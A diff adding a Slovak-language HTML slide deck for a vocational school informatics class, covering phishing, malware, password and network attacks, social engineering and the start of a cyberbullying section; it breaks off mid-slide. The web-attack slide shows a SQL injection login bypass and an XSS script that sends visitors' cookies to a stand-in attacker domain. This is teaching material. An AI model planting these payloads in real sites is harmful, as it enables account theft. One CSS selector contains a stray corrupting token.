@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Informatika – bezpečnosť, kyberšikana, hardvér, softvér, siete</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#F4F6FB; --ink:#0F1A2B; --muted:#5A6981; --line:#DEE4EF; --surface:#FFFFFF;
+  --primary:#2743E0; --primary-soft:#E9ECFF;
+  --teal:#0E9E8F; --teal-soft:#DCF3F0;
+  --amber:#D98200; --amber-soft:#FFF0D6;
+  --danger:#D5323E; --danger-soft:#FCE6E8;
+  --r:14px;
+  --sans:'Inter',system-ui,sans-serif;
+  --head:'Space Grotesk','Inter',system-ui,sans-serif;
+  --mono:'JetBrains Mono',ui-monospace,Consolas,monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%}
+body{
+  background:var(--bg); color:var(--ink); font-family:var(--sans);
+  font-size:clamp(15px,1.35vw,19px); line-height:1.55;
+  overflow:hidden; -webkit-font-smoothing:antialiased;
+}
+
+/* ---------- topbar ---------- */
+#bar{position:fixed;top:0;left:0;right:0;height:44px;display:flex;align-items:center;
+  gap:14px;padding:0 22px;background:rgba(244,246,251,.9);backdrop-filter:blur(8px);
+  border-bottom:1px solid var(--line);z-index:50}
+#bar .chip{font-family:var(--head);font-weight:600;font-size:.72em;letter-spacing:.09em;
+  text-transform:uppercase;color:var(--primary);background:var(--primary-soft);
+  padding:4px 11px;border-radius:100px}
+#bar .homelink{text-decoration:none;color:var(--muted);font-size:1.1em;line-height:1;
+  padding:3px 7px;border-radius:7px;transition:.14s}
+#bar .homelink:hover{background:var(--primary);color:#fff}
+#bar .sp{flex:1}
+#bar .count{font-family:var(--mono);font-size:.75em;color:var(--muted)}
+#prog{position:fixed;top:44px;left:0;height:3px;background:var(--primary);z-index:51;
+  width:0;transition:width .35s cubic-bezier(.4,0,.2,1)}
+
+/* ---------- slides ---------- */
+#deck{position:absolute;inset:44px 0 0 0}
+.slide{position:absolute;inset:0;display:none;flex-direction:column;justify-content:center;
+  padding:clamp(20px,3.2vw,52px) clamp(20px,5vw,90px) 76px;overflow-y:auto}
+.slide.on{display:flex;animation:in .42s cubic-bezier(.22,.9,.3,1)}
+@keyframes in{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+.slide>*{max-width:1180px;width:100%;margin-inline:auto;flex-shrink:0}
+
+h1{font-family:var(--head);font-weight:700;font-size:clamp(2.1em,5vw,3.5em);line-height:1.05;
+  letter-spacing:-.025em}
+h2{font-family:var(--head);font-weight:600;font-size:clamp(1.5em,3vw,2.2em);line-height:1.12;
+  letter-spacing:-.02em;margin-bottom:.35em}
+h3{font-family:var(--head);font-weight:600;font-size:1.05em;margin-bottom:.25em}
+.lead{color:var(--muted);font-size:1.05em;max-width:70ch;margin-bottom:1.1em}
+.eyebrow{font-family:var(--head);font-size:.72em;font-weight:600;letter-spacing:.12em;
+  text-transform:uppercase;color:var(--primary);margin-bottom:.6em}
+strong{font-weight:600}
+code,.mono{font-family:var(--mono);font-size:.9em;background:#EEF1F8;padding:1px 6px;
+  border-radius:5px;color:#233}
+a{color:var(--primary)}
+
+/* ---------- section divider ---------- */
+.divider{background:linear-gradient(135deg,#0F1A2B,#1B2A6B 65%,#2743E0);color:#fff}
+.divider h1{color:#fff}
+.divider .lead{color:#B9C4E6}
+.divider .num{font-family:var(--mono);font-size:.8em;color:#7E8FD6;letter-spacing:.2em;margin-bottom:1em}
+
+/* ---------- title slide ---------- */
+.title-slide{background:
+  radial-gradient(900px 500px at 12% 8%,#E9ECFF 0%,transparent 60%),
+  radial-gradient(700px 500px at 92% 96%,var(--teal-soft) 0%,transparent 60%),var(--bg)}
+.title-slide h1{max-width:16ch}
+.tags{display:flex;flex-wrap:wrap;gap:9px;margin-top:1.6em}
+.tags span{font-family:var(--head);font-size:.78em;font-weight:500;background:var(--surface);
+  border:1px solid var(--line);padding:7px 15px;border-radius:100px}
+
+/* ---------- building blocks ---------- */
+.grid{display:grid;gap:14px}
+.g2{grid-template-columns:repeat(2,1fr)}
+.g3{grid-template-columns:repeat(3,1fr)}
+.g4{grid-template-columns:repeat(4,1fr)}
+@media(max-width:860px){.g2,.g3,.g4{grid-template-columns:1fr}}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);padding:16px 18px}
+.card.warn{border-left:3px solid var(--amber)}
+.card.bad{border-left:3px solid var(--danger)}
+.card.good{border-left:3px solid var(--teal)}
+.card.info{border-left:3px solid var(--primary)}
+.card p{color:var(--muted);font-size:.94em}
+.ex{margin-top:.5em;font-size:.88em;color:var(--ink);background:var(--amber-soft);
+  border-radius:8px;padding:8px 11px}
+.ex.t{background:var(--teal-soft)}
+.ex b{font-family:var(--head)}
+ul{list-style:none}
+ul.bul li{position:relative;padding-left:1.3em;margin-bottom:.45em}
+ul.bul li::before{content:"";position:absolute;left:0;top:.6em;width:7px;height:7px;
+  border-radius:2px;background:var(--primary)}
+ol.num{counter-reset:c;list-style:none}
+ol.num li{counter-increment:c;position:relative;padding-left:2.1em;margin-bottom:.5em}
+ol.num li::before{content:counter(c);position:absolute;left:0;top:.05em;width:1.5em;height:1.5em;
+  border-radius:50%;background:var(--primary);color:#fff;font-family:var(--mono);font-size:.72em;
+  display:grid;place-items:center;font-weight:600}
+table{width:100%;border-collapse:collapse;font-size:.92em;background:var(--surface);
+  border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+th,td{padding:9px 13px;text-align:left;border-bottom:1px solid var(--line)}
+th{font-family:var(--head);font-weight:600;background:#F7F9FD;font-size:.9em}
+tr:last-child td{border-bottom:none}
+pre{background:#101B2E;color:#DFE7F5;border-radius:var(--r);padding:14px 16px;overflow-x:auto;
+  font-family:var(--mono);font-size:.85em;line-height:1.6}
+pre .c{color:#7E93B8}.k{color:#8AB4FF}.s{color:#7EE0C6}.r{color:#FF9AA2}
+
+/* ---------- nav ---------- */
+#nav{position:fixed;right:22px;bottom:18px;display:flex;gap:8px;z-index:50}
+#nav button{width:44px;height:44px;border-radius:12px;border:1px solid var(--line);
+  background:var(--surface);color:var(--ink);font-size:19px;cursor:pointer;
+  display:grid;place-items:center;transition:.15s;box-shadow:0 2px 8px rgba(15,26,43,.07)}
+#nav button:hover{background:var(--primary);color:#fff;border-color:var(--primary)}
+#hint{position:fixed;left:22px;bottom:24px;font-size:.75em;color:var(--muted);z-index:50}
+@media(max-width:700px){#hint{display:none}}
+
+/* ---------- interactive ---------- */
+.btn{font-family:var(--head);font-weight:600;font-size:.92em;background:var(--primary);color:#fff;
+  border:none;border-radius:10px;padding:10px 20px;cursor:pointer;transition:.15s}
+.btn:hover{background:#1C33B8}
+.btn.ghost{background:var(--surface);color:var(--primary);border:1px solid var(--primary)}
+.opt{display:block;width:100%;text-align:left;font:inherit;background:var(--surface);
+  border:1px solid var(--line);border-radius:10px;padding:11px 15px;margin-bottom:8px;
+  cursor:pointer;transition:.15s}
+.opt:hover:not(:disabled){border-color:var(--primary);background:var(--primary-soft)}
+.opt:disabled{cursor:default}
+.opt.ok{background:var(--teal-soft);border-color:var(--teal);font-weight:500}
+.opt.no{background:var(--danger-soft);border-color:var(--danger)}
+.fb{margin-top:10px;padding:11px 15px;border-radius:10px;font-size:.93em;display:none}
+.fb.show{display:block}
+.fb.ok{background:var(--teal-soft);border:1px solid var(--teal)}
+.fb.no{background:var(--danger-soft);border:1px solid var(--danger)}
+
+/* mail mockup */
+.mail{background:var(--surface);border:1px solid var(--line);border-radius:var(--r);
+  font-size:.93em;overflow:hidden}
+.mail .hd{padding:11px 16px;border-bottom:1px solid var(--line);background:#F7F9FD}
+.mail .bd{padding:15px 16px;line-height:1.7}
+.hit{cursor:pointer;border-bottom:2px dotted #B9C2D4;transition:.15s;padding:1px 2px;border-radius:4px}
+.hit:hover{background:#EEF1F8}
+.hit.found{background:var(--teal-soft);border-bottom:2px solid var(--teal);font-weight:500;cursor:default}
+.hit.miss{background:var(--danger-soft);animation:shake .3s}
+@keyframes shake{25%{transform:translateX(-4px)}75%{transform:translateX(4px)}}
+.notes{margin-top:10px;font-size:.88em}
+.notes div{padding:6px 10px;background:var(--teal-soft);border-radius:8px;margin-bottom:5px}
+
+/* password meter */
+.meter{height:9px;background:#E6EAF3;border-radius:100px;overflow:hidden;margin:10px 0}
+.meter i{display:block;height:100%;width:0;background:var(--danger);transition:.3s}
+input[type=text]{font-family:var(--mono);font-size:1em;width:100%;padding:11px 14px;
+  border:1px solid var(--line);border-radius:10px;background:var(--surface);color:var(--ink)}
+input[type=text]:focus{outline:2px solid var(--primary);border-color:transparent}
+
+/* matching */
+.match{display:grid;grid-template-columns:auto 1fr;gap:10px;align-items:center}
+.pool{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:14px}
+.pool button{font-family:var(--head);font-weight:600;font-size:.88em;background:var(--primary-soft);
+  border:1px solid var(--primary);color:var(--primary);border-radius:100px;padding:7px 16px;cursor:pointer}
+.pool button.sel{background:var(--primary);color:#fff}
+.pool button.used{opacity:.25;pointer-events:none}
+.zone{display:flex;align-items:center;gap:12px;background:var(--surface);border:1px solid var(--line);
+  border-radius:10px;padding:10px 14px;margin-bottom:7px;font-size:.93em;cursor:pointer}
+.zone:hover{border-color:var(--primary)}
+.slot{min-width:150px;font-family:var(--head);font-weight:600;font-size:.88em;color:var(--muted);
+  border:1px dashed #B9C2D4;border-radius:8px;padding:5px 12px;text-align:center}
+.slot.filled{border-style:solid;background:var(--primary-soft);border-color:var(--primary);color:var(--primary)}
+.zone.ok .slot{background:var(--teal-soft);border-color:var(--teal);color:var(--teal)}
+.zone.no .slot{background:var(--danger-soft);border-color:var(--danger);color:var(--danger)}
+
+/* code runner */
+textarea{font-family:var(--mono);font-size:.88em;width:100%;height:150px;padding:13px;
+  border-radius:var(--r);border:1px solid var(--line);background:#101B2E;color:#DFE7F5;
+  line-height:1.6;resize:vertical}
+.out{background:#0B1420;color:#7EE0C6;border-radius:var(--r);padding:13px;font-family:var(--mono);
+  font-size:.85em;min-height:70px;white-space:pre-wrap;line-height:1.6}
+
+/* network sim */
+.net{display:flex;align-items:center;justify-content:space-between;gap:6px;flex-wrap:wrap}
+.node{flex:1;min-width:110px;text-align:center;background:var(--surface);border:1px solid var(--line);
+  border-radius:var(--r);padding:13px 8px;transition:.3s;opacity:.45}
+.node.act{opacity:1;border-color:var(--primary);background:var(--primary-soft);
+  transform:translateY(-5px);box-shadow:0 8px 20px rgba(39,67,224,.16)}
+.node .ic{font-size:1.5em}
+.node .nm{font-family:var(--head);font-weight:600;font-size:.82em;margin-top:3px}
+.arrow{color:#B9C2D4;font-size:1.2em}
+.log{margin-top:12px;font-family:var(--mono);font-size:.83em;background:#101B2E;color:#DFE7F5;
+  border-radius:var(--r);padding:12px 15px;min-height:80px;line-height:1.7}
+
+.cta{display:inline-flex;align-items:center;gap:10px;font-family:var(--head);font-weight:600;
+  font-size:1.15em;background:var(--primary);color:#fff;text-decoration:none;padding:16px 30px;
+  border-radius:14px;transition:.2s;box-shadow:0 8px 24px rgba(39,67,224,.25)}
+.cta:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(39,67,224,.33)}
+.small{font-size:.85em;color:var(--muted)}
+
+/* ---------- ilustrácie a animácie ---------- */
+.flow .arrow{animation:fl 2s ease-in-out infinite}
+.flow .arrow:nth-of-type(2){animation-delay:.25s}
+.flow .arrow:nth-of-type(3){animation-delay:.5s}
+.flow .arrow:nth-of-type(4){animation-delay:.75s}
+@keyframes fl{0%,100%{opacity:.25;transform:translateX(-3px)}50%{opacity:1;transform:translateX(3px);color:var(--primary)}}
+
+.cycle{display:flex;align-items:center;gap:10px;background:var(--surface);border:1px solid var(--line);
+  border-radius:var(--r);padding:11px 14px;margin-bottom:14px}
+.cycle .st{flex:1;text-align:center;padding:8px 6px;border-radius:10px;font-family:var(--head);
+  font-weight:600;font-size:.88em;background:#F7F9FD;border:1px solid var(--line);transition:.3s}
+.cycle .st.on{background:var(--primary);color:#fff;border-color:var(--primary);
+  transform:translateY(-3px);box-shadow:0 6px 16px rgba(39,67,224,.22)}
+.cycle .ar{color:#B9C2D4;font-size:1.1em}
+.cycle .lb{font-family:var(--head);font-size:.72em;font-weight:600;letter-spacing:.08em;
+  text-transform:uppercase;color:var(--muted);white-space:nowrap}
+
+.ramdemo{margin-top:.8em}
+.mems{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.mem{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 11px}
+.mem h4{font-family:var(--head);font-size:.8em;font-weight:600;margin-bottom:6px}
+.cells{display:flex;gap:4px;flex-wrap:wrap;min-height:24px}
+.cell{padding:3px 7px;border-radius:6px;background:var(--primary-soft);border:1px solid var(--primary);
+  font-family:var(--mono);font-size:.62em;color:var(--primary);transition:.45s}
+.cell.disk{background:var(--teal-soft);border-color:var(--teal);color:var(--teal)}
+.cell.gone{opacity:0;transform:translateY(-12px) scale(.5)}
+
+.mb{width:100%;height:auto;border-radius:var(--r);background:#16233D}
+.mb .part{transition:.2s;cursor:pointer}
+.mb .part:hover{filter:brightness(1.45)}
+.mb .fdot{animation:mbf 2.2s linear infinite}
+.mb .fdot:nth-of-type(2){animation-delay:1.1s}
+@keyframes mbf{from{transform:translateX(0);opacity:0}20%{opacity:1}to{transform:translateX(46px);opacity:0}}
+dl.terms dt{font-family:var(--head);font-weight:600;font-size:.95em;margin-top:.6em}
+dl.terms dd{color:var(--muted);font-size:.9em}
+
+.race{margin-top:.7em}
+.lane{display:flex;align-items:center;gap:10px;margin-bottom:7px}
+.lane .nm{width:52px;font-family:var(--head);font-weight:600;font-size:.88em}
+.lane .tr{flex:1;height:15px;background:#E6EAF3;border-radius:100px;overflow:hidden}
+.lane .tr i{display:block;height:100%;width:0;border-radius:100px}
+.lane .t{width:46px;text-align:right;font-family:var(--mono);font-size:.82em;color:var(--muted)}
+
+.ddos{position:relative;height:66px;margin-top:.5em;background:#F7F9FD;border:1px solid var(--line);
+  border-radius:10px;overflow:hidden}
+.ddos .srv{position:absolute;right:12px;top:16px;font-size:1.6em;animation:wob .45s infinite}
+@keyframes wob{25%{transform:rotate(-5deg)}75%{transform:rotate(5deg)}}
+.ddos i{position:absolute;left:-12px;width:8px;height:8px;border-radius:50%;background:var(--danger);
+  animation:fly 1.7s linear infinite}
+@keyframes fly{0%{left:-12px;opacity:1}90%{opacity:.9}100%{left:calc(100% - 40px);opacity:0}}
+
+.spread{display:flex;gap:20px;align-items:flex-end;margin-top:1.9em;flex-wrap:wrap}
+.spread .dots{display:flex;flex-wrap:wrap;gap:4px;max-width:132px;margin-bottom:8px}
+.spread .dot{width:11px;height:11px;border-radius:50%;background:#8FA0E6;opacity:0;animation:pop2 .45s forwards}
+.spread span{display:block;font-family:var(--head);font-size:.76em;font-weight:600;color:#B9C4E6;
+  opacity:0;animation:pop2 .45s forwards}
+@keyframes pop2{from{opacity:0;transform:scale(.3)}to{opacity:1;transform:none}}
+claude c1.ttsbtn{display:inline-flex;align-items:center;gap:8px;font-family:var(--head);font-weight:600;
+  font-size:.72em;letter-spacing:.03em;background:var(--surface);color:var(--primary);
+  border:1px solid var(--line);border-radius:100px;padding:5px 13px;cursor:pointer;
+  transition:.15s;white-space:nowrap}
+.ttsbtn:hover{background:var(--primary-soft)}
+.ttsbtn.active{background:var(--primary);color:#fff;border-color:var(--primary)}
+/* ekvalizér – rozhýbe sa iba počas čítania */
+.eq{display:inline-flex;align-items:flex-end;gap:2px;width:15px;height:12px}
+.eq i{flex:1;background:currentColor;border-radius:1px;height:20%}
+.ttsbtn.playing .eq i{animation:eqb .82s ease-in-out infinite}
+.ttsbtn.playing .eq i:nth-child(2){animation-duration:.62s;animation-delay:.12s}
+.ttsbtn.playing .eq i:nth-child(3){animation-duration:1.05s;animation-delay:.24s}
+.ttsbtn.playing .eq i:nth-child(4){animation-duration:.74s;animation-delay:.06s}
+.ttsbtn.paused .eq i{animation-play-state:paused}
+@keyframes eqb{0%,100%{height:20%}50%{height:100%}}
+.speaking{background:var(--primary-soft);border-radius:4px;animation:spk 1.9s ease-in-out infinite}
+@keyframes spk{0%,100%{box-shadow:0 0 0 5px var(--primary-soft)}
+               50%{box-shadow:0 0 0 9px var(--primary-soft)}}
+.ttsnote{position:fixed;left:18px;bottom:76px;max-width:340px;background:var(--ink);color:#fff;
+  font-size:.72em;line-height:1.5;padding:11px 14px;border-radius:10px;z-index:60;
+  box-shadow:0 6px 20px rgba(15,26,43,.25)}
+@media(prefers-reduced-motion:reduce){*{animation:none!important}}
+</style>
+</head>
+<body>
+
+<div id="bar">
+  <a class="homelink" href="../index.html" title="Späť na hlavnú stránku">←</a>
+  <span class="chip" id="secName">Informatika</span>
+  <span class="sp"></span>
+  <button id="ttsBtn" class="ttsbtn" title="Prečítať slide nahlas (klávesa C)">
+    <span class="eq"><i></i><i></i><i></i><i></i></span><span id="ttsLbl">Čítať</span>
+  </button>
+  <span class="count" id="cnt">1 / 1</span>
+</div>
+<div id="prog"></div>
+
+<div id="deck">
+
+<!-- 1 -->
+<section class="slide title-slide" data-sec="Úvod">
+  <div class="eyebrow">Informatika · 1. ročník SOŠT Nižná</div>
+  <h1>Ako funguje počítač</h1>
+  <p class="lead" style="margin-top:.7em">Bezpečnosť · Kyberšikana · Hardvér · Softvér · Počítačové siete</p>
+  <div class="tags">
+    <span>🛡️ Útoky a obrana</span><span>💬 Kyberšikana</span><span>🖥️ Komponenty PC</span>
+    <span>💾 Softvér a licencie</span><span>🌐 Siete a internet</span>
+  </div>
+</section>
+
+<!-- 2 -->
+<section class="slide" data-sec="Úvod">
+  <h2>Informatika a IKT</h2>
+  <div class="grid g2" style="margin-top:1em">
+    <div class="card info"><h3>1 · Bezpečnosť</h3><p>Rozoznať 10 najčastejších útokov – od phishingu po ransomvér.</p></div>
+    <div class="card info"><h3>2 · Kyberšikana</h3><p>Spoznať jej formy na reálnych ukážkach správ a naučiť sa presný postup, čo robiť.</p></div>
+    <div class="card info"><h3>3 · Hardvér</h3><p>Popísať každý komponent.</p></div>
+    <div class="card info"><h3>4 · Softvér a siete</h3><p>Pochopiť rozdiel OS / aplikácia / firmvér, licencie a cestu dát od PC k serveru.</p></div>
+  </div>
+</section>
+
+<!-- ============ BEZPEČNOSŤ ============ -->
+<section class="slide divider" data-sec="Bezpečnosť">
+  <div class="num">ČASŤ 01</div>
+  <h1>Bezpečnosť</h1>
+  <p class="lead">Útočník nemusí byť génius. Väčšinou stačí, že ty si na chvíľu nepozorný.</p>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>Phishing – rybárčenie na heslá</h2>
+  <p class="lead">Podvodná správa sa tvári ako banka, škola, Microsoft alebo kuriér. Cieľ: aby si klikol a zadal prihlasovacie údaje na falošnej stránke.</p>
+  <div class="mail">
+    <div class="hd"><b>Od:</b> Slovenská sporiteľňa &lt;<span class="hit" data-bad="1" data-why="Doména nesedí – banka nikdy nepíše z .info adresy s preklepom v názve.">security@slsporitelna-overenie.info</span>&gt; &nbsp;·&nbsp; <b>Predmet:</b> <span class="hit" data-bad="1" data-why="Nátlak a časový limit – klasický znak podvodu. Banka nedáva klientovi 24 hodín pod hrozbou.">URGENTNE: Váš účet bude do 24 h zablokovaný!</span></div>
+    <div class="bd">
+      <span class="hit" data-bad="1" data-why="Neosobné oslovenie – banka pozná meno klienta, podvodník rozposiela tisíce e-mailov naraz.">Vážený klient,</span><br>
+      zaznamenali sme neobvyklé prihlásenie do vášho <span class="hit" data-bad="0">internetbankingu</span>.
+      Pre <span class="hit" data-bad="0">overenie totožnosti</span> kliknite na odkaz nižšie a zadajte
+      <span class="hit" data-bad="1" data-why="Žiadna banka nikdy nepýta PIN, heslo ani celé číslo karty cez e-mail alebo web z odkazu.">číslo karty, PIN a heslo</span>.<br><br>
+      → <span class="hit" data-bad="1" data-why="Text odkazu je iný ako skutočná adresa. Zobrazuje sa banka.sk, ale vedie inam.">www.banka.sk (skutočný cieľ: 193.42.11.8/login)</span><br><br>
+      <span class="hit" data-bad="0">S pozdravom, klientske centrum</span>
+    </div>
+  </div>
+  <p style="margin-top:12px"><b>Nájsť 5 podozrivých znakov</b> – klikaním do e-mailu. <span id="phCnt" class="mono">0 / 5</span></p>
+  <div class="notes" id="phNotes"></div>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>Malvér 1: vírus, červ, trójsky kôň</h2>
+  <p class="lead">Malvér = škodlivý softvér. Delí sa podľa toho, <b>ako sa šíri</b> a <b>čo robí</b>.</p>
+  <div class="grid g3">
+    <div class="card bad"><h3>🦠 Vírus</h3><p>Pripojí sa k existujúcemu súboru (napr. <code>.exe</code>). Šíri sa až vtedy, keď ten súbor niekto spustí.</p>
+      <div class="ex"><b>Príklad:</b> stiahnutý „crack" na hru sa spustí – vírus sa nakopíruje do ďalších .exe súborov v PC.</div></div>
+    <div class="card bad"><h3>🪱 Červ (worm)</h3><p>Nepotrebuje hostiteľský súbor ani zásah používateľa. Sám sa kopíruje po sieti cez diery v systéme.</p>
+      <div class="ex"><b>Príklad:</b> WannaCry (2017) – za pár hodín zamkol 200 000 počítačov v 150 krajinách, vrátane nemocníc.</div></div>
+    <div class="card bad"><h3>🐴 Trójsky kôň</h3><p>Tvári sa ako užitočný program, na pozadí otvára útočníkovi zadné vrátka.</p>
+      <div class="ex"><b>Príklad:</b> „Zrýchli si PC zadarmo!" – nástroj naozaj niečo vyčistí, ale zároveň odošle uložené heslá z prehliadača.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>Malvér 2: ransomvér, spyware, adware</h2>
+  <div class="grid g3">
+    <div class="card bad"><h3>🔒 Ransomvér</h3><p>Zašifruje všetky súbory a pýta výkupné (obvykle v kryptomene). Bez zálohy sú dáta väčšinou nenávratne preč.</p>
+      <div class="ex"><b>Ukážka:</b> všetky súbory sa premenujú na <code>foto.jpg.locked</code> a na ploche pribudne <code>README.txt</code> s adresou peňaženky.</div></div>
+    <div class="card bad"><h3>👁️ Spyware / keylogger</h3><p>Ticho sleduje. Keylogger zaznamenáva každý stlačený kláves vrátane hesiel a posiela ich útočníkovi.</p>
+      <div class="ex"><b>Príklad:</b> prihlásenie na Instagram v školskom PC s keyloggerom – útočník má heslo o 3 sekundy neskôr.</div></div>
+    <div class="card bad"><h3>📢 Adware / hijacker</h3><p>Zaplaví obrazovku reklamou, zmení domovskú stránku a vyhľadávač, presmerúva výsledky hľadania.</p>
+      <div class="ex"><b>Príklad:</b> po inštalácii konvertora PDF pribudnú v prehliadači 3 lišty, ktoré sa nedajú vypnúť.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>Útoky na heslá</h2>
+  <div class="grid g3" style="margin-bottom:14px">
+    <div class="card warn"><h3>Brute force</h3><p>Program skúša <b>všetky</b> kombinácie znakov, kým netrafí. Rýchlosť: aj miliardy pokusov za sekundu.</p></div>
+    <div class="card warn"><h3>Slovníkový útok</h3><p>Skúša zoznam najčastejších hesiel a slov. <code>heslo123</code>, <code>Password1</code>, <code>futbal</code> padnú okamžite.</p></div>
+    <div class="card warn"><h3>Credential stuffing</h3><p>Heslo uniknuté z jednej služby útočník vyskúša na Gmaile, Instagrame, Steame. Preto <b>nikdy to isté heslo dvakrát</b>.</p></div>
+  </div>
+  <div class="card">
+    <h3>Vyskúšať naživo</h3>
+    <p class="small">Po zadaní hesla sa zobrazí, ako dlho by trvalo prelomiť ho hrubou silou (10 miliárd pokusov/s).</p>
+    <input type="text" id="pw" placeholder="sem zadať skúšobné heslo…" autocomplete="off">
+    <div class="meter"><i id="pwBar"></i></div>
+    <div id="pwOut" class="mono" style="font-size:.9em">—</div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>Útoky cez sieť</h2>
+  <div class="grid g3">
+    <div class="card bad"><h3>🕵️ Man-in-the-Middle</h3><p>Útočník sa vloží medzi používateľa a server a číta (alebo mení) prenášané dáta.</p>
+      <div class="ex"><b>Ukážka:</b> na stanici sa dá pripojiť na Wi-Fi „Free_WiFi_Zilina". Nie je to stanica – je to notebook v batohu, cez ktorý ide celá komunikácia.</div></div>
+    <div class="card bad"><h3>💥 DoS / DDoS</h3><p>Zahltenie servera miliónmi požiadaviek naraz, kým nespadne. DDoS = útok z tisícok nakazených zariadení (botnet).</p>
+      <div class="ddos">
+        <span class="srv">🖥️</span>
+        <i style="top:8px;animation-delay:0s"></i><i style="top:20px;animation-delay:.2s"></i>
+        <i style="top:32px;animation-delay:.45s"></i><i style="top:44px;animation-delay:.1s"></i>
+        <i style="top:52px;animation-delay:.6s"></i><i style="top:14px;animation-delay:.8s"></i>
+        <i style="top:38px;animation-delay:.95s"></i><i style="top:26px;animation-delay:1.25s"></i>
+      </div>
+      <div class="ex"><b>Príklad:</b> počas prihlasovania na maturitu server odmietne všetkých – nie preto, že je slabý, ale preto, že ho niekto zaplavil.</div></div>
+    <div class="card bad"><h3>🎭 Spoofing / fake AP</h3><p>Podvrhnutie identity – falošná e-mailová adresa, falošné telefónne číslo, falošný Wi-Fi hotspot s názvom školskej siete.</p>
+      <div class="ex"><b>Obrana:</b> na verejnej Wi-Fi neriešiť banku, použiť mobilné dáta alebo VPN a kontrolovať <code>https://</code>.</div></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>Útoky na webové aplikácie</h2>
+  <div class="grid g2">
+    <div>
+      <h3>SQL injection</h3>
+      <p class="small">Do formulára sa napíše kus databázového príkazu. Ak ho aplikácia neošetrí, vykoná ho.</p>
+      <pre><span class="c">// prihlasovací formulár, do mena zadám:</span>
+<span class="r">' OR '1'='1</span>
+
+<span class="c">// vznikne dotaz:</span>
+<span class="k">SELECT</span> * <span class="k">FROM</span> users
+<span class="k">WHERE</span> meno=<span class="s">''</span> <span class="k">OR</span> <span class="s">'1'='1'</span>;
+<span class="c">// podmienka platí vždy → prihlási ma bez hesla</span></pre>
+    </div>
+    <div>
+      <h3>XSS (cross-site scripting)</h3>
+      <p class="small">Do komentára sa vloží skript, ktorý sa spustí každému, kto stránku otvorí.</p>
+      <pre><span class="c">&lt;!-- vložené do komentára na fóre --&gt;</span>
+<span class="k">&lt;script&gt;</span>
+  fetch(<span class="s">'zloduch.sk/x?c='</span>+document.cookie)
+<span class="k">&lt;/script&gt;</span>
+<span class="c">// útočník získa cookie = prihlásenie
+// návštevníkov bez ich hesla</span></pre>
+    </div>
+  </div>
+  <p class="small" style="margin-top:10px">💡 Obrana je vždy na strane programátora: <b>vstupu od používateľa sa nikdy neverí</b> – treba ho skontrolovať a ošetriť.</p>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>Sociálne inžinierstvo – hack na človeka</h2>
+  <p class="lead">Najslabší článok nie je technika, ale dôverčivosť. Útočník neláme heslo – vypýta si ho.</p>
+  <div class="grid g2">
+    <div class="card warn"><h3>Vishing (telefonát)</h3><p>„Dobrý deň, technická podpora Microsoftu, váš počítač je nakazený, nainštalujte nám prosím vzdialený prístup."</p></div>
+    <div class="card warn"><h3>Smishing (SMS)</h3><p>„Vaša zásielka čaká na doplatok 2,10 €, potvrďte tu: packeta-doplatok.xyz"</p></div>
+    <div class="card warn"><h3>Podvod CEO / rodič</h3><p>„Ahoj mami, rozbil sa mi mobil, píšem z nového čísla, môžeš mi hneď poslať 300 €?"</p></div>
+    <div class="card warn"><h3>Tailgating / shoulder surfing</h3><p>Vojde do budovy spolu s oprávnenou osobou na jej kartu, alebo len pozerá cez rameno pri zadávaní PIN.</p></div>
+  </div>
+</section>
+
+<section class="slide" data-sec="Bezpečnosť">
+  <h2>7 pravidiel obrany</h2>
+  <ol class="num" style="max-width:80ch;margin-top:.6em">
+    <li><b>Dlhé heslo namiesto zložitého.</b> <code>modrykonPijeCaj7</code> je bezpečnejšie aj ľahšie zapamätateľné ako <code>Ab#3x</code>.</li>
+    <li><b>Iné heslo do každej služby</b> – použiť správcu hesiel (Bitwarden, KeePass, správca v prehliadači).</li>
+    <li><b>Zapnúť dvojfaktorové overenie (2FA).</b> Aj keď heslo unikne, útočník nemá kód z mobilu.</li>
+    <li><b>Aktualizovať systém a prehliadač.</b> Väčšina červov využíva diery, ktoré sú už mesiace opravené.</li>
+    <li><b>Zálohovať pravidlom 3-2-1</b> – 3 kópie, 2 rôzne médiá, 1 mimo domu. Jediná skutočná obrana proti ransomvéru.</li>
+    <li><b>Overiť odosielateľa iným kanálom</b> – zavolať mame na staré číslo, banke na číslo z karty, nie z SMS.</li>
+    <li><b>Sťahovať len z oficiálnych zdrojov.</b> Žiadne cracky, keygeny a „modifikované" inštalačky.</li>
+  </ol>
+</section>
+
+<!-- ============ KYBERŠIKANA ============ -->
+<section class="slide divider" data-sec="Kyberšikana">
+  <div class="num">ČASŤ 02</div>
+  <h1>Kyberšikana</h1>
+  <p class="lead">Rozdiel oproti bežnej šikane: nemá koniec vyučovania a nemá hranice triedy.</p>
+  <div class="spread" id="spread"></div>
+</section>
+
+<section class="slide" data-sec="Kyberšikana">
+  <h2>Čo je kyberšikana a čím je horšia</h2>
+  <p class="lead">Opakované úmyselné ubližovanie cez digitálne technológie – správy, príspevky, fotky, videá, komentáre.</p>
+  <div class="grid g4">
